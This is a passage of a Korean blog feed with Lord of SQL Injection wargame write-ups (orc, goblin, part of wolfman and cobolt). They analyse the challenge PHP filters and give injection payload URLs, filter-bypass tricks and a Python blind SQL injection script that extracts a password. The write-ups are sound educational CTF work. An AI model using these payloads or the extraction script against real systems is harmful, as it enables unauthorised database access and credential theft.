때문이다.</p><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>Tab</p><p>ASCII Code 표를 살펴보면 16진수로 <code>0x09</code>는 <code>Tab</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%09or%09id=&apos;admin&apos;--%09-</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span><span class="keyword">or</span><span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">---'</span></span><br></pre></td></tr></table></figure><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>주석</p><p>MySQL에서 구문 사이에 주석을 넣으면 공백이 없어도 정상적으로 동작한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;/**/or/**/id=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>주석으로 <code>#</code>을 쓴 이유는 <code>-- -</code>을 사용할 때 가운데 공백으로 주석을 사용하면 정상적으로 작동하지 않기 때문이다.</p><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 5번 wolfman 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.4 Orc</title>
    <link href="https://www.jslee.me/2019/08/15/los-write-up-04-orc/"/>
    <id>https://www.jslee.me/2019/08/15/los-write-up-04-orc/</id>
    <published>2019-08-15T02:23:17.000Z</published>
    <updated>2019-08-20T11:08:10.031Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 4번 orc 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>기본적인 Blind SQL Injection을 할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string addslashes ( string $str )</span><br></pre></td></tr></table></figure><ul><li><code>addslashes</code> 함수는 데이터베이스 질의 등에서 처리할 필요가 있는 문자(홑따옴표(‘), 겹따옴표(“), 백슬래시(\), NUL(NULL 바이트)) 앞에 백슬래시를 붙인 문자열을 반환한다.</li><li>php의 <code>addslashes</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.addslashes.php" target="_blank" rel="noopener">PHP: addslashes - Manual</a></li></ul><h4 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h4><p>4번 orc 문제같은 경우 실제 <code>pw</code>값을 알아내야 한다. 이때 화면에 <code>Hello admin</code>이라는 문자열이 출력되었는지 안 되었는지 여부에 따라 조작한 SQL문의 조건절이 참인지 거짓인지 알아낼 수 있다.</p><p>이처럼 SQL Injection이 가능하고 조작한 SQL문의 조건절이 참인지 거짓인지를 구분할 수 있는 경우 원하는 데이터를 하나씩 알아낼 수 있는데, 이를 Blind SQL Injection 이라고 한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>orc 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello admin&lt;/h2&gt;"</span>;</span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orc"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 pw를 받고, pw에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello admin&lt;/h2&gt;"</span>;</span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orc"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello admin&quot;</code> 이라는 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>SUBSTR</code> 함수 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=&apos; or id=&apos;admin&apos; and length(pw)=8-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_orc <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">length</span>(pw)=<span class="number">8</span><span class="comment">-- -'</span></span><br></pre></td></tr></table></figure><p>이는 <code>&quot;Hello admin&quot;</code>을 출력하게 만든다. 즉, <code>pw</code>는 8자리임을 알아낸 것이다.</p><p>이와 비슷한 방법으로 쿼리를 조작하면 <code>pw</code> 역시 전부 알아낼 수 있다.</p><p>하지만 이를 반복하여 8자리를 모두 알아내는 것은 사람이 하기 버거우므로 python 코드를 작성하여 풀면 편하다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request <span class="comment"># python3의 내장 라이브러리인 urllib의 request 모듈을 사용할 수 있도록 이 코드에 불러온다.</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="comment"># python3의 내장 라이브러리인 urllib의 parse 모듈에 들어있는 quote 함수를 사용할 수 있도록 이 코드에 불러온다.</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span> <span class="comment"># pw값을 저장할 문자열 변수</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>): <span class="comment"># 8자리임을 알아냈으므로 i에는 1부터 8까지 들어가도록 반복문을 구성</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>): <span class="comment"># ASCII Code에서 화면에 출력 가능한 문자의 10진수 범위는 32부터 126까지이다.</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="</span> <span class="comment"># 공격할 URL에서 변하지 않는 부분이다.</span></span><br><span class="line">        data = <span class="string">"' or id='admin' and substr(pw, 1, &#123;&#125;)='&#123;&#125;'#"</span>.format(</span><br><span class="line">            str(i), key + chr(j)) <span class="comment"># 반복문을 진행하며 계속 다른 문자가 들어갈 문자열이다.</span></span><br><span class="line">        print(data) <span class="comment"># 반복문이 한 번 돌 때마다 URL을 출력하도록 한다.</span></span><br><span class="line">        data = quote(data) <span class="comment"># URL Encoding을 해 준다.</span></span><br><span class="line">        re = urllib.request.Request(url + data) <span class="comment"># 1행에서 불러온 request 모듈의 Request 클래스를 통해 Request 객체를 만든다.</span></span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>) <span class="comment"># re 객체의 header에 User-agent를 추가한다. User-agent가 없으면 403 Forbidden 오류가 난다.</span></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"</span></span><br><span class="line">        ) <span class="comment"># re 객체의 header에 Cookie로 본인이 로그인한 클라이언트의 PHPSESSID를 추가한다. 이것이 없으면 페이지가 login_chk()에 걸려 그 다음 처리를 하지 않고 &lt;script&gt;location.href='./';&lt;/script&gt; 만 응답한다.</span></span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re) <span class="comment"># 객체를 이용해 요청을 보낸다.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>: <span class="comment"># 응답에서 "Hello admin"이라는 문자열을 찾은 경우. find()는 찾으면 시작 인덱스를, 못 찾으면 -1을 반환하는 함수이다.</span></span><br><span class="line">            key += chr(j).lower() <span class="comment"># key 변수 뒤에 ASCII Code로 j값에 해당하는 문자를 붙인다.</span></span><br><span class="line">            print(key) <span class="comment"># key를 출력한다.</span></span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># i번째 위치의 문자를 찾았으므로 반복문을 탈출한다.</span></span><br><span class="line">print(key) <span class="comment"># 반복문이 끝나면 최종적으로 찾아낸 8글자 key를 출력한다.</span></span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>295d5844</code> 를 출력한다.<br>이를 GET방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=295d5844</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 4번 orc 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.3 Goblin</title>
    <link href="https://www.jslee.me/2019/08/14/los-write-up-03-goblin/"/>
    <id>https://www.jslee.me/2019/08/14/los-write-up-03-goblin/</id>
    <published>2019-08-14T12:34:04.000Z</published>
    <updated>2019-08-20T11:08:10.031Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 3번 goblin 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>따옴표를 사용하지 않고 원하는 문자열을 <code>SELECT</code> 하도록 SQL을 조작할 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>goblin 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>no</code>를 받고, <code>no</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>no</code>에 <code>&#39;</code>, <code>&quot;</code>, ` 가 들어 있으면 <code>No Quotes ~_~</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>LIMIT</code> 구문 이용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=-1 or 1=1 limit 1,1-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_goblin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> <span class="keyword">no</span>=<span class="number">-1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p><code>LIMIT</code> 구문을 이용한 SQL Injection이 잘 이해가 되지 않으면 <strong>2번 Cobolt 문제 Write Up</strong>의 <strong>3번 Solution</strong> 부분을 참고하자.</p></li><li><p><code>CHAR</code> 함수 및 ASCII 코드 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=-1 or id=char(97, 100, 109, 105, 110)-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_goblin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> <span class="keyword">no</span>=<span class="number">-1</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="built_in">char</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>이는 ASCII에서 10진수 표기를 문자 표기로 바꿔주는 MySQL 함수인 <code>CHAR</code>를 이용하여 <code>id</code>가 <code>admin</code>인 행을 찾아 선택하도록 만든다.<br>ASCII에서, <code>&#39;a&#39;</code>=<code>97</code>, <code>&#39;d&#39;</code>=<code>100</code>, <code>&#39;m&#39;</code>=<code>109</code>, <code>&#39;i&#39;</code>=<code>105</code>, <code>&#39;n&#39;</code>=<code>110</code>이다.</p><p>따라서 이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p><code>ASCII</code>, <code>SUBSTR</code> 함수 및 ASCII 코드 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=-1 or ascii(substr(id, 1, 1))=97-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_goblin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> <span class="keyword">no</span>=<span class="number">-1</span> <span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">id</span>, <span class="number">1</span>, <span class="number">1</span>))=<span class="number">97</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>이는 ASCII에서 문자 표기자 10진수 표기로 바꿔주는 MySQL 함수인 <code>ASCII를</code> 이용하여 <code>id</code>가 <code>a</code>로 시작하는 행을 찾아 선택하도록 만든다.<br>이번에는 운이 좋아 a로 시작하는 첫번째 행이 admin이었지만, 만약 안되면 1번째 글자가 <code>a</code>, 2번째 글자가 <code>d</code>, 3번째 글자가 <code>m</code>, 4번째 글자가 <code>i</code>, 5번째 글자가 <code>n</code>인 행을 찾도록 조작하면 된다.<br>ASCII에서, <code>&#39;a&#39;</code>=<code>97</code>이다.</p><p>따라서 이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 3번 goblin 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.2 Cobolt</title>
    <link href="https://www.jslee.me/2019/08/13/los-write-up-02-cobolt/"/>
    <id>https://www.jslee.me/2019/08/13/los-write-up-02-cobolt/</id>
    <published>2019-08-13T11:47:11.000Z</published>
    <updated>2019-08-13T15:38:11.373Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 2번 cobolt 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>SQL Injection을 통해 원하는 값을 <code>SELECT</code> 하도록 조작할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h4><p>MySQL에는 <code>SELECT</code>절에 <code>LIMIT</code>이라는 구문을 이용하여 반환되는 행을 제한하는 기능이 있다.<br><a href="https://dev.mysql.com/doc/" target="_blank" rel="noopener">MySQL Documentation</a>에서 <a href="https://dev.mysql.com/doc/refman/5.7/en/select.html" target="_blank" rel="noopener">SELECT절에 대한 문서</a>를 찾아보면 다음과 같은 